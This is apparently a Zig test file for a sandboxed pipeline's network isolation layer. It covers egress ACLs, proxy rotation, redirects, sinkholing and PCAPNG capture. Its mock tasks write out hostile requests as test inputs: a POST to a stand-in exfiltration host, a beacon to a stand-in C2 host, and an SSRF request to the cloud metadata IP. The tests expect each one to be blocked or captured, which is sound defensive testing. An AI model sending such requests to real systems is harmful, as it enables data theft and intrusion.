const std = @import("std");
const vidsec = @import("vidsec");
const yaml_mod = vidsec.yaml;
const ast_mod = vidsec.pipeline_ast;
const network_mod = vidsec.network;
const abi = vidsec.abi;
const pipeline = vidsec.pipeline;
const extensions = vidsec.extensions;

test "YAML to AST: Reactive Virtual Network Adapters (L4/L7 Policy, Rate-Limit, Proxies, Redirects, DNS, PCAPNG)" {
    const yaml_text =
        \\version: 2
        \\runtime:
        \\  workers: 2
        \\  default_network: isolated
        \\datasources:
        \\  pipeline_memory:
        \\    type: memory
        \\networks:
        \\  isolated:
        \\    driver: none
        \\  api_egress:
        \\    driver: egress
        \\    policy:
        \\      default_action: deny
        \\      block_private_ips: true
        \\      block_loopback: true
        \\      block_link_local: true
        \\      allow_rules:
        \\        - hosts: ["api.mangadex.org", "*.mangadex.network"]
        \\          ports: [443]
        \\          schemes: ["https", "wss"]
        \\          operations: ["GET", "HEAD", "HANDSHAKE"]
        \\          resources: ["/manga/*", "/at-home/server/*"]
        \\    pool:
        \\      max_connections_per_host: 8
        \\      max_total_connections: 32
        \\      max_inflight_requests: 64
        \\    rate_limit:
        \\      requests_per_second: 5
        \\      burst_size: 10
        \\      max_bandwidth_mbps: 50
        \\      respect_retry_after: true
        \\    proxies:
        \\      strategy: weighted
        \\      circuit_breaker:
        \\        failure_threshold: 2
        \\        cooldown_ms: 15000
        \\        failover_on_status: [429, 502, 503]
        \\      endpoints:
        \\        - url: "socks5://127.0.0.1:9050"
        \\          weight: 3
        \\        - url: "http://proxy-backup.local:8080"
        \\          weight: 1
        \\    dns:
        \\      servers: ["1.1.1.1:53"]
        \\      cache_ttl_sec: 300
        \\      overrides:
        \\        "api.mangadex.org": "104.18.40.10"
        \\    redirects:
        \\      - from: "https://uploads.mangadex.org/*"
        \\        to: "https://local-mirror.internal/mangadex/$1"
        \\        preserve_path: true
        \\    routes:
        \\      - match_hosts: ["api.mangadex.org"]
        \\        proxy_strategy: sticky_host
        \\    capture:
        \\      enabled: true
        \\      format: pcapng
        \\      datasource: pipeline_memory
        \\      snaplen: 4096
        \\      include_tls_keys: true
        \\  virtual_tap:
        \\    driver: sinkhole
        \\    emulate_responses: true
        \\pipelines:
        \\  main:
        \\    steps:
        \\      - id: fetch_chapters
        \\        uses: manga/fetch
        \\        in: stream
        \\        network: api_egress
        \\      - id: sandbox_eval
        \\        uses: analyzer/eval
        \\        in: stream
        \\        networks: [virtual_tap, api_egress]
        \\        outputs:
        \\          net_events:
        \\            from: network.captured_events
        \\            datasource: pipeline_memory
    ;

    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const parsed_ast = try yaml_mod.loadPipelineAstFromYaml(alloc, yaml_text, .{});

    try std.testing.expectEqualStrings("isolated", parsed_ast.runtime.default_network);
    try std.testing.expectEqual(@as(usize, 3), parsed_ast.networks.len);

    const api_net = parsed_ast.getNetwork("api_egress").?;
    try std.testing.expectEqual(ast_mod.NetworkDriver.egress, api_net.driver);
    try std.testing.expect(api_net.policy.block_private_ranges);
    try std.testing.expectEqual(@as(usize, 1), api_net.policy.allow_rules.len);
    try std.testing.expectEqualStrings("api.mangadex.org", api_net.policy.allow_rules[0].hosts[0]);
    try std.testing.expectEqual(@as(f64, 5.0), api_net.rate_limit.requests_per_second);
    try std.testing.expectEqual(@as(usize, 10), api_net.rate_limit.burst);
    try std.testing.expectEqual(ast_mod.ProxyStrategy.weighted, api_net.proxies.strategy);
    try std.testing.expectEqual(@as(usize, 2), api_net.proxies.endpoints.len);
    try std.testing.expectEqual(@as(u32, 3), api_net.proxies.endpoints[0].weight);
    try std.testing.expectEqual(@as(usize, 1), api_net.redirects.len);
    try std.testing.expect(api_net.capture.enabled);
    try std.testing.expect(api_net.capture.include_tls_keys);
    try std.testing.expectEqual(@as(u32, 4096), api_net.capture.snaplen);

    const tap_net = parsed_ast.getNetwork("virtual_tap").?;
    try std.testing.expectEqual(ast_mod.NetworkDriver.sinkhole, tap_net.driver);
    try std.testing.expect(tap_net.emulate_responses);

    const main_pipe = parsed_ast.getPipeline("main").?;
    try std.testing.expectEqualStrings("api_egress", main_pipe.steps[0].task.primaryNetwork("isolated"));
    try std.testing.expectEqualStrings("virtual_tap", main_pipe.steps[1].task.primaryNetwork("isolated"));
    try std.testing.expectEqual(@as(usize, 2), main_pipe.steps[1].task.networks.len);
}

const MockTasks = struct {
    /// Task running on `isolated` (`driver: none`) - all network requests and streams must be denied by Host.
    fn isolatedTask(raw_ctx: *abi.TaskContext_ABI) callconv(.c) abi.TaskStatus_ABI {
        const ctx = abi.TaskContext.init(raw_ctx);
        if (ctx.netFetch("https://api.mangadex.org/manga/123")) |_| {
            return .fatal_error;
        } else |err| {
            if (err != error.NetworkPolicyDenied) return .fatal_error;
        }
        return .ok;
    }

    /// Task running on `api_egress` - exercises Redirects, ACL, Proxy Pool, stateful stream lifecycle (`netConnect`/`netSend`/`netRecv`/`netClose`), and PCAPNG capture.
    fn egressScraperTask(raw_ctx: *abi.TaskContext_ABI) callconv(.c) abi.TaskStatus_ABI {
        const ctx = abi.TaskContext.init(raw_ctx);

        // 1. Allowed request to api.mangadex.org
        const r1 = ctx.netFetch("https://api.mangadex.org/manga/solo-leveling") catch return .fatal_error;
        if (r1.status_code != 200) return .fatal_error;
        if (r1.proxy_used.len == 0) return .fatal_error;

        // 2. Transparent redirect from uploads.mangadex.org -> local-mirror.internal
        const r2 = ctx.netFetch("https://uploads.mangadex.org/data/ch1/page1.png") catch return .fatal_error;
        if (!std.mem.eql(u8, r2.effective_url.toSlice(), "https://local-mirror.internal/mangadex/data/ch1/page1.png")) {
            return .fatal_error;
        }

        // 3. Disallowed domain -> blocked by L7 ACL
        if (ctx.netRequest(.{
            .url = abi.Slice_ABI.fromSlice("https://evil-exfil.org/steal"),
            .operation = abi.Slice_ABI.fromSlice("POST"),
        })) |_| {
            return .fatal_error;
        } else |err| {
            if (err != error.NetworkPolicyDenied) return .fatal_error;
        }

        // 4. Stateful bidirectional stream lifecycle (`wss://` via `net_connect` / `net_send` / `net_recv` / `net_close`)
        const stream_h = ctx.netConnect("wss://api.mangadex.org/manga/events", "HANDSHAKE") catch return .fatal_error;
        ctx.netSend(stream_h, "SUBSCRIBE:manga_updates") catch return .fatal_error;
        var recv_buf: [128]u8 = undefined;
        const read_n = ctx.netRecv(stream_h, &recv_buf) catch return .fatal_error;
        if (read_n == 0) return .fatal_error;
        ctx.netClose(stream_h) catch return .fatal_error;

        return .ok;
    }

    /// Task running on `virtual_tap` (`driver: sinkhole`) - captures beacon attempts and triggers router.
    fn sinkholeEvalTask(raw_ctx: *abi.TaskContext_ABI) callconv(.c) abi.TaskStatus_ABI {
        const ctx = abi.TaskContext.init(raw_ctx);
        const resp = ctx.netFetch("https://c2-tracker.bad/beacon") catch return .fatal_error;
        if (resp.status_code != 200) return .fatal_error;
        return .ok;
    }

    fn quarantineTask(_: *abi.TaskContext_ABI) callconv(.c) abi.TaskStatus_ABI {
        return .ok;
    }
};

test "End-to-End PipelineEngine & EngineNetworkController: Isolation, Streams, Sinkhole Telemetry, and PCAPNG Persistence (Datasource + Disk)" {
    const pcap_disk_path = "/tmp/vidsec_test_egress_capture.pcapng";
    const yaml_text =
        \\version: 2
        \\runtime:
        \\  workers: 1
        \\  default_network: isolated
        \\datasources:
        \\  pipeline_memory:
        \\    type: memory
        \\networks:
        \\  isolated:
        \\    driver: none
        \\  api_egress:
        \\    driver: egress
        \\    policy:
        \\      default_action: deny
        \\      block_private_ips: false
        \\      allow_rules:
        \\        - hosts: ["api.mangadex.org", "local-mirror.internal"]
        \\          ports: [443]
        \\          schemes: ["https", "wss"]
        \\          operations: ["GET", "HANDSHAKE"]
        \\          resources: ["/manga/*", "/mangadex/*"]
        \\    proxies:
        \\      strategy: round_robin
        \\      endpoints:
        \\        - url: "socks5://127.0.0.1:9050"
        \\        - url: "socks5://127.0.0.1:9051"
        \\    redirects:
        \\      - from: "https://uploads.mangadex.org/*"
        \\        to: "https://local-mirror.internal/mangadex/$1"
        \\    capture:
        \\      enabled: true
        \\      format: pcapng
        \\      datasource: pipeline_memory
        \\      channel: egress_pcap_dump
        \\      path: /tmp/vidsec_test_egress_capture.pcapng
        \\      snaplen: 2048
        \\      include_tls_keys: true
        \\  virtual_tap:
        \\    driver: sinkhole
        \\    emulate_responses: true
        \\pipelines:
        \\  main:
        \\    steps:
        \\      - id: step_isolated
        \\        uses: nettest/isolated_check
        \\        in: stream
        \\      - id: step_scrape
        \\        uses: nettest/egress_scraper
        \\        in: stream
        \\        network: api_egress
        \\      - id: evaluate_target
        \\        uses: nettest/sinkhole_eval
        \\        in: stream
        \\        network: virtual_tap
        \\        outputs:
        \\          net_events:
        \\            from: network.captured_events
        \\            datasource: pipeline_memory
        \\      - router: check_suspicious_network
        \\        cases:
        \\          - when: "count(evaluate_target.net_events) > 0"
        \\            goto: quarantine_flow
        \\        default: continue
        \\  quarantine_flow:
        \\    steps:
        \\      - id: flag_suspicious
        \\        uses: nettest/quarantine
        \\        in: stream
    ;

    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const parsed_ast = try yaml_mod.loadPipelineAstFromYaml(alloc, yaml_text, .{});

    var modules = pipeline.ModuleRegistry.init(alloc);
    defer modules.deinit();

    const tasks = [_]abi.TaskDescriptor_ABI{
        .{
            .task_name = "isolated_check",
            .description = "Verify driver: none blocks all outbound requests",
            .execute = &MockTasks.isolatedTask,
        },
        .{
            .task_name = "egress_scraper",
            .description = "Verify L7 ACL, URL redirect, proxy rotation, stateful streams, and PCAPNG",
            .execute = &MockTasks.egressScraperTask,
        },
        .{
            .task_name = "sinkhole_eval",
            .description = "Verify driver: sinkhole captures network events",
            .execute = &MockTasks.sinkholeEvalTask,
        },
        .{
            .task_name = "quarantine",
            .description = "Quarantine branch target",
            .execute = &MockTasks.quarantineTask,
        },
    };
    const manifest = abi.ModuleManifest_ABI{
        .abi_version = abi.VIDSEC_ABI_VERSION,
        .module_name = "nettest",
        .module_version = .{ .major = 1, .minor = 0, .patch = 0 },
        .tasks_ptr = &tasks,
        .tasks_len = tasks.len,
    };
    try modules.registerStaticModule("nettest", &manifest);

    var repos = pipeline.RepositoryRegistry.init(alloc);
    defer repos.deinit();
    try extensions.datasource.registerDefaultDrivers(&repos);

    var net_reg = network_mod.NetworkRegistry.init(alloc);
    defer net_reg.deinit();

    var engine = pipeline.PipelineEngine.init(alloc, parsed_ast, &modules, &repos);
    engine.withNetworks(&net_reg);

    const dummy_bytes = "manga-seed-payload";
    const summary = try engine.run(pipeline.PayloadHandle.fromSlice(u8, dummy_bytes));

    // All 4 steps executed (including `flag_suspicious` inside `quarantine_flow`)
    try std.testing.expectEqual(@as(usize, 4), summary.steps_executed);
    try std.testing.expectEqual(@as(usize, 1), summary.routers_evaluated);
    try std.testing.expectEqualStrings("quarantine_flow", summary.final_pipeline);

    // Inspect `api_egress` adapter telemetry & PCAPNG binary capture via VTable
    const egress_adapter = net_reg.get("api_egress").?;
    const egress_metrics = egress_adapter.metrics();
    // 2 HTTP GETs + 1 WSS HANDSHAKE = 3 allowed; 1 evil-exfil POST = 1 blocked; + 1 stream_send frame = 5 packets
    try std.testing.expectEqual(@as(usize, 3), egress_metrics.requests_allowed);
    try std.testing.expectEqual(@as(usize, 1), egress_metrics.requests_blocked);
    try std.testing.expectEqual(@as(usize, 5), egress_metrics.packets_captured);

    const pcap_bytes = egress_adapter.pcapBytes().?;
    try std.testing.expect(pcap_bytes.len > 128);
    // Verify PCAPNG Section Header Block magic (0x0A0D0D0A)
    const shb_magic = std.mem.readInt(u32, pcap_bytes[0..4], .little);
    try std.testing.expectEqual(@as(u32, 0x0A0D0D0A), shb_magic);
    // Verify embedded step metadata comment in PCAPNG
    try std.testing.expect(std.mem.indexOf(u8, pcap_bytes, "step_id=step_scrape task=egress_scraper") != null);

    // Verify `EngineNetworkController.flushCaptures` persisted PCAPNG into `pipeline_memory` channel `egress_pcap_dump`
    const mem_repo = repos.get("pipeline_memory").?;
    const stored_pcap_handle = mem_repo.readPayload("egress_pcap_dump").?;
    try std.testing.expectEqualSlices(u8, pcap_bytes, stored_pcap_handle.asSlice(u8));

    // Verify `EngineNetworkController.flushCaptures` also persisted PCAPNG to disk at `capture.path`
    const disk_pcap = try pipeline.readFileBytes(alloc, pcap_disk_path);
    try std.testing.expectEqualSlices(u8, pcap_bytes, disk_pcap);

    // Inspect `net_events` persisted into `pipeline_memory` datasource
    const stored_events_handle = mem_repo.readPayload("net_events").?;
    try std.testing.expectEqual(@as(usize, 1), stored_events_handle.len);
    const ev_slice = stored_events_handle.asSlice(pipeline.NetworkEvent);
    try std.testing.expectEqualStrings("evaluate_target", ev_slice[0].step_id);
    try std.testing.expectEqualStrings("c2-tracker.bad", ev_slice[0].dst_host);
    try std.testing.expectEqualStrings("MOCKED", ev_slice[0].verdict);
}

test "Standalone Lego Composition: Domain-Agnostic MiddlewareChain, Wire Framing (HTTP/1.1, SOCKS5, WS, RTMP), and VTable contracts" {
    const alloc = std.testing.allocator;

    var net_reg = network_mod.NetworkRegistry.init(alloc);
    defer net_reg.deinit();

    // Instantiate an EgressAdapter purely from `contracts.AdapterConfig` (zero YAML/AST/step_id involvement)
    const adapter = try net_reg.resolveOrCreate(network_mod.AdapterConfig{
        .id = "multi_proto_egress",
        .driver_name = "egress",
        .policy = .{
            .block_private_ranges = true,
            .allow_rules = &.{
                .{
                    .schemes = &.{ "https", "wss", "rtmps" },
                    .hosts = &.{ "*.mangadex.org", "ingest.stream.io" },
                    .ports = &.{
                        .{ .min = 443, .max = 443 },
                        .{ .min = 1935, .max = 1935 },
                    },
                    .operations = &.{ "GET", "HANDSHAKE", "PUBLISH" },
                    .resources = &.{ "/manga/*", "/events", "/live/*" },
                },
            },
        },
        .proxies = .{
            .strategy_name = "weighted",
            .endpoints = &.{
                .{ .url = "socks5://10.10.0.1:9050", .weight = 2 },
                .{ .url = "socks5://10.10.0.2:9050", .weight = 1 },
            },
        },
    });

    // 1. Dispatches `https` to `HttpTransport` (status 200 + RFC 9112 wire frame)
    const r_http = try adapter.execute("https://api.mangadex.org/manga/abc", "GET", "", "trace=http_1");
    try std.testing.expectEqual(@as(u16, 200), r_http.status_code);
    try std.testing.expectEqualStrings("socks5://10.10.0.1:9050", r_http.proxy_used);
    try std.testing.expect(std.mem.startsWith(u8, r_http.wire_request, "GET /manga/abc HTTP/1.1\r\n"));

    // 2. Dispatches `wss` to `StreamTransport` (status 101 Switching Protocols + RFC 6455 Upgrade wire frame)
    const r_ws = try adapter.execute("wss://ws.mangadex.org/events", "HANDSHAKE", "", "trace=ws_1");
    try std.testing.expectEqual(@as(u16, 101), r_ws.status_code);
    try std.testing.expectEqualStrings("socks5://10.10.0.2:9050", r_ws.proxy_used);
    try std.testing.expect(std.mem.indexOf(u8, r_ws.wire_request, "Upgrade: websocket\r\n") != null);

    // 3. Dispatches `rtmps` to `StreamTransport` (status 101 + RTMP C1 handshake frame) and rotates back to weight=2 proxy
    const r_rtmp = try adapter.execute("rtmps://ingest.stream.io:1935/live/ch1", "PUBLISH", "", "trace=rtmp_1");
    try std.testing.expectEqual(@as(u16, 101), r_rtmp.status_code);
    try std.testing.expectEqualStrings("socks5://10.10.0.1:9050", r_rtmp.proxy_used);
    try std.testing.expect(std.mem.indexOf(u8, r_rtmp.wire_request, "RTMP_C1_HANDSHAKE") != null);

    // 4. Verify SOCKS5 RFC 1928 and HTTP/1.1 Retry-After wire parsers directly
    var socks_buf: [64]u8 = undefined;
    const socks_frame = try network_mod.transports.PosixSocket.buildSocks5ConnectRequest(&socks_buf, "api.mangadex.org", 443);
    try std.testing.expectEqual(@as(u8, 0x05), socks_frame[0]);
    try std.testing.expectEqual(@as(u8, 0x03), socks_frame[3]);

    const parsed_429 = try network_mod.transports.HttpTransport.parseHttp11Response(
        "HTTP/1.1 429 Too Many Requests\r\nRetry-After: 7\r\nContent-Length: 4\r\n\r\nslow",
    );
    try std.testing.expectEqual(@as(u16, 429), parsed_429.status_code);
    try std.testing.expectEqual(@as(u64, 7000), parsed_429.retry_after_ms);
    try std.testing.expectEqualStrings("slow", parsed_429.body);

    // 5. Blocks SSRF attempt to cloud metadata IP (`169.254.169.254`) via `PolicyGuardMiddleware`
    try std.testing.expectError(
        error.NetworkPolicyDenied,
        adapter.execute("https://169.254.169.254/latest/meta-data", "GET", "", "trace=ssrf"),
    );
}
